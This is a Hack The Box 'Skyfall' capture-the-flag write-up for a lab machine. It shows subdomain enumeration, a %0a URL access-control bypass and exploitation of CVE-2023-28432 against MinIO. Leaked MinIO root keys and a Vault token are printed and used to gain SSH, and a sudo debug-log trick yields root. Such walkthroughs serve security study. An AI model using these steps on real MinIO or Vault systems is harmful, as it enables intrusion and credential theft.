---
title: HTB-Skyfall
draft: false
tags:
  - htb
  - linux
  - insane
  - minio
  - mc
  - vault
---
![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/skyfall/Skyfall.png)

## Information Gathering

Rustscan finds SSH and HTTP open:

`rustscan --addresses 10.10.11.254 --range 1-65535`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/skyfall/image.png)

Nmap scan doesn't find anything extra:

`sudo nmap -sVC -p 80 10.10.11.254`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/skyfall/image-1.png)

## Enumeration
### HTTP - TCP 80

The website is just a normal company introduction site:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/skyfall/image-2.png)

Scrolling down a little, there's employee names and the domain name **skyfall.htb**:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/skyfall/image-3.png)

Let's add it to `/etc/hosts`.

Now that we know the domain name of the target, let's try bruteforcing subdomains:

`sudo gobuster vhost --append-domain -u http://skyfall.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/skyfall/image-4.png)

**demo.skyfall.htb** is found. 

### demo.skyfall.htb

After adding **demo.skyfall.htb** to `/etc/hosts`, we can access the website:


![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/skyfall/image-5.png)

There's a login portal, and the demo login credentials (guest:guest) is written on it.

Using the demo login credentials, we can login:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/skyfall/image-6.png)

At the menu bar on the left, there is **MinioMetrics**.

> MinIO metrics are data points that provide insights into the performance, usage, and health of a MinIO deployment. MinIO is an open-source object storage server compatible with Amazon S3, and it includes built-in metrics that help administrators monitor and manage the system effectively.

Let's try accessing it:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/skyfall/image-7.png)

Unfortunately, we are not allowed in.

After spending some time, we are able to bypass it by adding `%0a` at the end of the url.

`/metrics` page shows **MinIO Internal Metrics**:


![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/skyfall/image-8.png)

Scrolling down, we come across the MinIO endpoint:


![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/skyfall/image-9.png)

Let's add `prd23-s3-backend.skyfall.htb` to `/etc/hosts`.
### prd23-s3-backend.skyfall.htb

Accessing `prd23-s3-backend.skyfall.htb`, it shows **Access Denied** message: 

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/skyfall/image-10.png)


## Shell as askyy
### CVE-2023-28432

Researching on exploits regarding MinIO metrics, it seems like we'd be able to exploit **CVE-2023-28432**:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/skyfall/image-11.png)


Let's follow [this exploit](https://github.com/acheiii/CVE-2023-28432/).

Taking a look at the exploit, it seems like it is sending post request to `/minio/bootstrap/v1/verfiy`:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/skyfall/image-12.png)

Let's build a Burp Suite request as such:

`POST /minio/bootstrap/v1/verify`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/skyfall/image-13.png)

We have now obtained MinIO credentials:

```
MINIO_ROOT_USER:5GrE1B2YGGyZzNHZaIww
MINIO_ROOT_PASSWORD:GkpjkmiVmpFuL2d3oRx0
```

### MinIO Client

**mc** is a command-line client for **MinIO**, an open-source object storage server compatible with Amazon S3 cloud storage service.

Using [this tutorial](https://min.io/docs/minio/linux/reference/minio-mc.html#id2), let's down load **mc**:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/skyfall/image-14.png)

We first set the alias and credentials for the remote MinIO as such:

`mc alias set myminio http://prd23-s3-backend.skyfall.htb 5GrE1B2YGGyZzNHZaIww GkpjkmiVmpFuL2d3oRx0`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/skyfall/image-15.png)

We can list the top-level buckets (directories) in **myminio**:

`mc ls myminio`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/skyfall/image-16.png)

Let's take a look at files inside of it as well:

`mc ls --recursive --versions myminio`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/skyfall/image-17.png)

**home_backup.tar.gz** must be interesting. 

After spending some time enumerating, we discovered that **v2** contains interesting information:

`mc cp --vid 2b75346d-2a47-4203-ab09-3c9f878466b8 myminio/askyy/home_backup.tar.gz ~/Documents/htb/skyfall/home_backup.tar.gz`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/skyfall/image-18.png)

### Vault

Unzipping the file, we see bunch of juicy files:

`sudo tar xzvf home_backup.tar.gz`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/skyfall/image-19.png)

On `.bashrc`, we can see **VALUT_TOKEN** and **VALUT_API_ADDR**:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/skyfall/image-20.png)

Let's first add **prd23-vault-internal.skyfall.htb** to `/etc/hosts`.

Researching  a bit on what we can do with this information, it seems like we would be able to [SSH-in](https://developer.hashicorp.com/vault/docs/secrets/ssh/one-time-ssh-passwords) using **VAULT_TOKEN**.

Let's download vault tool for interaction:

`wget https://releases.hashicorp.com/vault/1.15.5/vault_1.15.5_linux_amd64.zip`

Now, we set the **VAULT_ADDR** and **VAULT_TOKEN** alias as such:

`export VAULT_ADDR="http://prd23-vault-internal.skyfall.htb"`

`export VAULT_TOKEN="hvs.CAESIJlU9JMYEhOPYv4igdhm9PnZDrabYTobQ4Ymnlq1qY-LGh4KHGh2cy43OVRNMnZhakZDRlZGdGVzN09xYkxTQVE"`

Now we can interact with the remote vault:

`./vault login`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/skyfall/image-21.png)

Let's first check the capabilities (permissions) of the current Vault token for the specified path (`ssh/roles` in this case):

`./vault token capabilities ssh/roles`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/skyfall/image-23.png)

We can also list the available SSH roles configured in the Vault server:

`./vault list ssh/roles`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/skyfall/image-24.png)

Now we can establish an SSH connection using a one-time password (OTP) generated by Vault:

`./vault ssh -role dev_otp_key_role -mode OTP -strict-host-key-checking=no askyy@10.10.11.254`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/skyfall/image-22.png)

We have shell as **askyy**.
## Privesc: askyy to root
### Sudoers

Let's first check what commands can be ran with sudo privilege:

`sudo -l`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/skyfall/image-25.png)

command `sudo /root/vault/vault-unseal -c /etc/vault-unseal.yaml`, can be ran as sudo with no password.

Let's run the command and see what happens:

`sudo /root/vault/vault-unseal -c /etc/vault-unseal.yaml -vd`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/skyfall/image-27.png)

We can see that **debug.log** file is created:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/skyfall/image-28.png)

However, we can't view the log file since it belong to the root:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/skyfall/image-29.png)

After removing and recreating the file as askyy, we should be able to view the log file. 

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/skyfall/image-30.png)

After running the command `sudo /root/vault/vault-unseal -c /etc/vault-unseal.yaml -vd ` again, we see that **debug.log** file can be viewed and it contains new **VAULT_TOKEN** for the root.

### SSH as root

After exiting out from the SSH sessions, let's export **VAULT_TOKEN** and **VAULT_ADDR** for the root:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/skyfall/image-31.png)

Now we have SSH shell as the root:

`./vault ssh -role admin_otp_key_role -mode OTP -strict-host-key-checking=no root@10.10.11.254`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/skyfall/image-32.png)

## References
- https://github.com/acheiii/CVE-2023-28432/
- https://min.io/docs/minio/linux/reference/minio-mc.html#id2